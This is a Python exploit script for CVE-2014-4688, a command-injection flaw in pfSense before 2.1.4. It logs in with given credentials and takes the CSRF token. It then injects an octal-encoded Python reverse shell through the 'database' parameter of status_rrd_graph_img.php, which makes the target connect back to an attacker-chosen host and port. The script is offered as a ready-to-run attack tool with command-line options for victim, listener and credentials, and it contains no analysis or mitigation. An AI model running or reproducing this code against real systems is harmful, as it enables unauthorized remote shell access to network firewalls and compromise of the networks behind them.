import argparse
import requests
import urllib3
import urllib
import collections
import sys
from log_colors import *
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# CVE-2014-4688
# pfSense before 2.1.4 allows 
# remote authenticated users 
# to execute arbitrary commands via
# (1) the hostname value to diag_dns.php in a Create Alias action,
# (2) the smartmonemail value to diag_smart.php, or 
# (3) the database value to status_rrd_graph_img.php.
class CVE2014_4688:

    def __init__(self, lhost, lport, rhost, usr, pswd):
        print (LogColors.BLUE + "victim: " + rhost + "..." + LogColors.ENDC)
        self.lhost, self.lport = lhost, lport
        self.rhost = rhost
        self.usr, self.pswd = usr, pswd
        self.session = requests.Session()
        self.login_url = "https://" + self.rhost + "/index.php"
        self.headers = {
            'User-Agent' : 'Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0',
            'Accept' : 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language' : 'en-US,en;q=0.5',
            'Referer' : self.login_url,
            'Connection' : 'close',
            'Upgrade-Insecrure-Requests' : '1',
            'Content-Type' : 'application/x-www-form-urlencoded',
        }

    # get csrf token
    def get_csrf_token(self):
        print (LogColors.BLUE + "get csrf token..." + LogColors.ENDC)
        try:
            r = self.session.get(self.login_url, verify = False)
            if r.ok:
                i = r.text.find("csrfMagicToken")
                csrf = r.text[i:i + 128].split('"')[-1]
                self.csrf = csrf
                print (LogColors.YELLOW + "csrf: " + csrf + "..." + LogColors.ENDC)
        except Exception:
            print (LogColors.RED + "error parse csrf :(" + LogColors.ENDC)

    # login
    def login(self):
        self.get_csrf_token()
        print (LogColors.BLUE + "login..." + LogColors.ENDC)
        data = {
            "__csrf_magic" : self.csrf,
            "usernamefld" : self.usr,
            "passwordfld" : self.pswd,
            "login" : "Login",
        }
        data = collections.OrderedDict(data)
        data = urllib.parse.urlencode(data)
        r = self.session.post(
            self.login_url,
            data = data, headers = self.headers, verify = False,
            cookies = self.session.cookies
        )
        if r.ok and "/index.php?logout" in r.text:
            print (LogColors.YELLOW + "successfully login..." + LogColors.ENDC)
        else:
            print (LogColors.RED + "error login..." + LogColors.ENDC)
            sys.exit()

    # generate payload
    def generate_payload(self):
        print (LogColors.BLUE + "generate payload..." + LogColors.ENDC)
        cmd = "python -c 'import socket,subprocess,os;"
        cmd += "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
        cmd += 's.connect(("' + self.lhost + '",' + self.lport + '));'
        cmd += 'os.dup2(s.fileno(),0);'
        cmd += 'os.dup2(s.fileno(),1);'
        cmd += 'os.dup2(s.fileno(),2);'
        cmd += 'p=subprocess.call(["/bin/sh","-i"]);'

        payload = ""
        for c in cmd:
            payload += ("\\" + oct(ord(c)).lstrip("0o"))

        return payload

    # exploit
    def run(self):
        self.login()
        print (LogColors.BLUE + "running exploit..." + LogColors.ENDC)
        payload = self.generate_payload()
        exploit_url = "https://" + self.rhost + "/status_rrd_graph_img.php?"
        exploit_url += "database=queues;" + "printf+" + "'" + payload + "'|sh"
        print (LogColors.YELLOW + "exploit: " + exploit_url + LogColors.ENDC)
        try:
            r = self.session.get(exploit_url,
                headers = self.headers, timeout = 10, verify = False
            )
            if r.status_code:
                print (LogColors.RED + "failed running exploit :(" + LogColors.ENDC)
            else:
                print (LogColors.GREEN + "successfully exploited. hacked :)" + LogColors.ENDC)
                print (LogColors.GREEN + "check shell on " + self.lhost + ":" + self.lport + LogColors.ENDC)
        except Exception as e:
            print (LogColors.RED + "failed running exploit :(" + LogColors.ENDC)

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-t','--target', required = True, help = "target victim host/ip")
    parser.add_argument('-l','--lhost', required = True, help = "my shell host")
    parser.add_argument('-p', '--lport', required = True, help = "my shell port")
    parser.add_argument('-u', '--username', required = True, help = "pfsense username")
    parser.add_argument('-s', '--password', required = True, help = "pfsense password")
    args = vars(parser.parse_args())
    rhost = args['target']
    lhost, lport = args['lhost'], args['lport']
    usr, pswd = args['username'], args['password']
    cve = CVE2014_4688(lhost, lport, rhost, usr, pswd)
    cve.run()

